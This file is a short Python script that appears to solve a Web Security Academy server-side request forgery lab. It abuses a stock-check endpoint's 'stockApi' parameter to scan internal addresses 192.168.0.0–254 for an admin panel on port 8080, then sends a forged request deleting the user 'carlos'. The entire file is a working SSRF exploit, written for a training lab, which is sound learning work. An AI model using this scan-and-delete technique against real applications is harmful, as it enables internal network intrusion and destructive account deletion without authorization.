import requests
stock_url = 'https://ac7f1f881f184271c023602a00ef0062.web-security-academy.net/product/stock/'

for i in range(0,255):
    print(i)
    ssrf_data = {
        'stockApi' : f'http://192.168.0.{i}:8080/admin'
    }
    resp = requests.post(stock_url, data=ssrf_data)
    if resp.status_code == 200:
        print(f'Admin interface at 192.168.0.{i}')

        stock_api_data = {
            'stockApi': f'http://192.168.0.{i}:8080/admin/delete?username=carlos'
        }
        resp = requests.post(stock_url, data=stock_api_data)
        print(resp.text)
        break